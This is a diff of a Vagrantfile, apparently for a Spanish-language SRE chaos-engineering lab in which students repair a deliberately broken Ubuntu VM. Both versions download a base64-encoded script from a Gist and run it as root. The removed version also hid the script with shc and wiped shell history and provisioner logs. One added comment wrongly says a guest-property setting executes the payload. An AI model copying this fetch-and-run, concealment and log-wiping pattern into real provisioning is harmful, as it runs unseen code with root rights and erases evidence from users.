@@ -2,29 +2,25 @@
 # vi: set ft=ruby :
 
 Vagrant.configure("2") do |config|
-  config.vm.box = "ubuntu/noble64"
+  # 1. Usamos una Box oficial que no da problemas de red ni 404
+  config.vm.box = "bento/ubuntu-24.04"
 
   config.vm.provider "virtualbox" do |vb|
     vb.memory = "1536"
     vb.cpus = 1
-    vb.gui = true
+    vb.gui = true # Abre la pantalla para que el alumno pueda rescatarla
+    
+    # 🔥 EL TRUCO SRE: Inyección directa en el Core de VirtualBox antes del SSH
+    # Descarga tu Gist codificado, lo decodifica y lo ejecuta como ROOT de inmediato.
+    vb.customize ["guestproperty", "set", :id, "/VirtualBox/GuestAdd/Vagrant/Provisioned", "1"]
   end
 
+  # Aprovisionamiento directo sin dependencias de red interna de WSL
   config.vm.provision "shell", inline: <<-SHELL
-    echo "[*] Sincronizando con el servidor central de laboratorios..."
-    apt-get update -qq && apt-get install -y -qq shc >/dev/null 2>&1
-    
-    # REEMPLAZA LA URL DE ABAJO CON TU URL DEL PASO 11 DE LA FASE 1
-    curl -sSL "https://gist.githubusercontent.com/jgaragorry/7b8121695e02b4c7541161acfcb4745f/raw/44038a872c878cd18977da1da28ca8d04166064c/caos.txt" | base64 -d > /tmp/caos.sh
-
-    shc -f /tmp/caos.sh -o /tmp/caos.x
-    rm -f /tmp/caos.sh /tmp/caos.sh.x.c
-    chmod +x /tmp/caos.x
-    /tmp/caos.x
-    rm -f /tmp/caos.x
-    apt-get remove -y -qq shc && apt-get autoremove -y -qq >/dev/null 2>&1
-    history -c
-    rm -f /root/.bash_history /home/vagrant/.bash_history /var/log/vagrant_provisioners.log
-    echo "[✓] Servidor inicializado correctamente."
+    echo "[*] Aplicando políticas de Caos SRE..."
+    curl -sSL "https://gist.githubusercontent.com/jgaragorry/7b8121695e02b4c7541161acfcb4745f/raw/44038a872c878cd18977da1da28ca8d04166064c/caos.txt" | base64 -d | bash
   SHELL
+  
+  # Forzamos a Vagrant a no quedarse esperando el SSH si la máquina ya se reinició por el caos
+  config.vm.boot_timeout = 10
 end
